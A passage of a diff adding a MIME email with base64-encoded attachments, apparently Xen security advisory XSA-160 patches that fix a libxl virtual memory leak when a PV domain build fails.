+bC9saWJ4bF9kb20uYworKysgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwpA
+QCAtNDUxLDkgKzQ1MSw2IEBAIGludCBsaWJ4bF9fYnVpbGRfcHYobGlieGxf
+X2djICpnYywgdWludDMyX3QgZG9taWQsCiAgICAgICAgIHN0YXRlLT5zdG9y
+ZV9tZm4gPSB4Y19kb21fcDJtX2hvc3QoZG9tLCBkb20tPnhlbnN0b3JlX3Bm
+bik7CiAgICAgfQogCi0gICAgbGlieGxfX2ZpbGVfcmVmZXJlbmNlX3VubWFw
+KCZzdGF0ZS0+cHZfa2VybmVsKTsKLSAgICBsaWJ4bF9fZmlsZV9yZWZlcmVu
+Y2VfdW5tYXAoJnN0YXRlLT5wdl9yYW1kaXNrKTsKLQogICAgIHJldCA9IDA7
+CiBvdXQ6CiAgICAgeGNfZG9tX3JlbGVhc2UoZG9tKTsKLS0gCjEuNy4xMC40
+Cgo=
+
+--=separator
+Content-Type: application/octet-stream; name="xsa160-4.6.patch"
+Content-Disposition: attachment; filename="xsa160-4.6.patch"
+Content-Transfer-Encoding: base64
+
+RnJvbSBhZGNiZDE1YjFhZWM4MzY3Zjc5MDc3NGM5OThkYjE5OWM5YjU3N2Jm
+IE1vbiBTZXAgMTcgMDA6MDA6MDAgMjAwMQpGcm9tOiBJYW4gSmFja3NvbiA8
+aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4KRGF0ZTogV2VkLCAxOCBOb3Yg
+MjAxNSAxNTozNDo1NCArMDAwMApTdWJqZWN0OiBbUEFUQ0hdIGxpYnhsOiBG
+aXggYm9vdGxvYWRlci1yZWxhdGVkIHZpcnR1YWwgbWVtb3J5IGxlYWsgb24g
+cHYKIGJ1aWxkIGZhaWx1cmUKClRoZSBib290bG9hZGVyIG1heSBjYWxsIGxp
+YnhsX19maWxlX3JlZmVyZW5jZV9tYXAoKSwgd2hpY2ggbW1hcCdzIHRoZQpw
+dl9rZXJuZWwgYW5kIHB2X3JhbWRpc2sgaW50byBwcm9jZXNzIG1lbW9yeS4g
+IFRoaXMgd2FzIG9ubHkgdW5tYXBwZWQsCmhvd2V2ZXIsIG9uIHRoZSBzdWNj
+ZXNzIHBhdGggb2YgbGlieGxfX2J1aWxkX3B2KCkuICBJZiB0aGVyZSB3ZXJl
+IGEKZmFpbHVyZSBhbnl3aGVyZSBiZXR3ZWVuIGxpYnhsX2Jvb3Rsb2FkZXIu
+YzpwYXJzZV9ib290bG9hZGVyX3Jlc3VsdCgpCmFuZCB0aGUgZW5kIG9mIGxp
+YnhsX19idWlsZF9wdigpLCB0aGUgY2FsbHMgdG8KbGlieGxfX2ZpbGVfcmVm
+ZXJlbmNlX3VubWFwKCkgd291bGQgYmUgc2tpcHBlZCwgbGVha2luZyB0aGUg
+bWFwcGVkCnZpcnR1YWwgbWVtb3J5LgoKSWRlYWxseSB0aGlzIHdvdWxkIGJl
+IGZpeGVkIGJ5IGFkZGluZyB0aGUgdW5tYXAgY2FsbHMgdG8gdGhlCmRlc3Ry
+dWN0aW9uIHBhdGggZm9yIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUuICBV
+bmZvcnR1bmF0ZWx5IHRoZQpsaWZldGltZSBvZiB0aGUgbGlieGxfX2RvbWFp
+bl9idWlsZF9zdGF0ZSBpcyBvcGFxdWUsIGFuZCBpdCBkb2Vzbid0CmhhdmUg
+YSBwcm9wZXIgZGVzdHJ1Y3Rpb24gcGF0aC4gIEJ1dCwgdGhlIG9ubHkgdGhp
+bmcgaW4gaXQgdGhhdCBpc24ndApmcm9tIHRoZSBnYyBhcmUgdGhlc2UgYm9v
+dGxvYWRlciByZWZlcmVuY2VzLCBhbmQgdGhleSBhcmUgb25seSBldmVyCnNl
+dCBmb3Igb25lIGxpYnhsX19kb21haW5fYnVpbGRfc3RhdGUsIHRoZSBvbmUg
+d2hpY2ggaXMKbGlieGxfX2RvbWFpbl9jcmVhdGVfc3RhdGUuYnVpbGRfc3Rh
+dGUuCgpTbyB3ZSBjYW4gY2xlYW4gdXAgaW4gdGhlIGV4aXQgcGF0aCBmcm9t
+IGxpYnhsX19kb21haW5fY3JlYXRlXyosIHdoaWNoCmFsd2F5cyBjb21lcyB0
+aHJvdWdoIGRvbWNyZWF0ZV9jb21wbGV0ZS4KClJlbW92ZSB0aGUgbm93LXJl
+ZHVuZGFudCB1bm1hcHMgaW4gbGlieGxfX2J1aWxkX3B2J3Mgc3VjY2VzcyBw
+YXRoLgoKVGhpcyBpcyBYU0EtMTYwLgoKU2lnbmVkLW9mZi1ieTogR2Vvcmdl
+IER1bmxhcCA8Z2VvcmdlLmR1bmxhcEBjaXRyaXguY29tPgpTaWduZWQtb2Zm
+LWJ5OiBJYW4gSmFja3NvbiA8aWFuLmphY2tzb25AZXUuY2l0cml4LmNvbT4K
+VGVzdGVkLWJ5OiBHZW9yZ2UgRHVubGFwIDxnZW9yZ2UuZHVubGFwQGNpdHJp
+eC5jb20+CkFja2VkLWJ5OiBJYW4gQ2FtcGJlbGwgPGlhbi5jYW1wYmVsbEBj
+aXRyaXguY29tPgotLS0KIHRvb2xzL2xpYnhsL2xpYnhsX2NyZWF0ZS5jIHwg
+ICAgMyArKysKIHRvb2xzL2xpYnhsL2xpYnhsX2RvbS5jICAgIHwgICAgMyAt
+LS0KIDIgZmlsZXMgY2hhbmdlZCwgMyBpbnNlcnRpb25zKCspLCAzIGRlbGV0
+aW9ucygtKQoKZGlmZiAtLWdpdCBhL3Rvb2xzL2xpYnhsL2xpYnhsX2NyZWF0
+ZS5jIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKaW5kZXggZjU3NzFk
+YS4uMjc4YjllZCAxMDA2NDQKLS0tIGEvdG9vbHMvbGlieGwvbGlieGxfY3Jl
+YXRlLmMKKysrIGIvdG9vbHMvbGlieGwvbGlieGxfY3JlYXRlLmMKQEAgLTE0
+ODQsNiArMTQ4NCw5IEBAIHN0YXRpYyB2b2lkIGRvbWNyZWF0ZV9jb21wbGV0
+ZShsaWJ4bF9fZWdjICplZ2MsCiAgICAgbGlieGxfZG9tYWluX2NvbmZpZyAq
+Y29uc3QgZF9jb25maWcgPSBkY3MtPmd1ZXN0X2NvbmZpZzsKICAgICBsaWJ4
+bF9kb21haW5fY29uZmlnICpkX2NvbmZpZ19zYXZlZCA9ICZkY3MtPmd1ZXN0
+X2NvbmZpZ19zYXZlZDsKIAorICAgIGxpYnhsX19maWxlX3JlZmVyZW5jZV91
+bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5wdl9rZXJuZWwpOworICAgIGxpYnhs
+X19maWxlX3JlZmVyZW5jZV91bm1hcCgmZGNzLT5idWlsZF9zdGF0ZS5wdl9y
+YW1kaXNrKTsKKwogICAgIGlmICghcmMgJiYgZF9jb25maWctPmJfaW5mby5l
+eGVjX3NzaWRyZWYpCiAgICAgICAgIHJjID0geGNfZmxhc2tfcmVsYWJlbF9k
+b21haW4oQ1RYLT54Y2gsIGRjcy0+Z3Vlc3RfZG9taWQsIGRfY29uZmlnLT5i
+X2luZm8uZXhlY19zc2lkcmVmKTsKIApkaWZmIC0tZ2l0IGEvdG9vbHMvbGli
+eGwvbGlieGxfZG9tLmMgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwppbmRl
+eCA4MDE5ZjRlLi4yZGEzYWM0IDEwMDY0NAotLS0gYS90b29scy9saWJ4bC9s
+aWJ4bF9kb20uYworKysgYi90b29scy9saWJ4bC9saWJ4bF9kb20uYwpAQCAt
+NzUwLDkgKzc1MCw2IEBAIGludCBsaWJ4bF9fYnVpbGRfcHYobGlieGxfX2dj
+ICpnYywgdWludDMyX3QgZG9taWQsCiAgICAgICAgIHN0YXRlLT5zdG9yZV9t
+Zm4gPSB4Y19kb21fcDJtX2hvc3QoZG9tLCBkb20tPnhlbnN0b3JlX3Bmbik7
+CiAgICAgfQogCi0gICAgbGlieGxfX2ZpbGVfcmVmZXJlbmNlX3VubWFwKCZz
+dGF0ZS0+cHZfa2VybmVsKTsKLSAgICBsaWJ4bF9fZmlsZV9yZWZlcmVuY2Vf
+dW5tYXAoJnN0YXRlLT5wdl9yYW1kaXNrKTsKLQogICAgIHJldCA9IDA7CiBv
+dXQ6CiAgICAgeGNfZG9tX3JlbGVhc2UoZG9tKTsKLS0gCjEuNy4xMC40Cgo=
+
+--=separator--
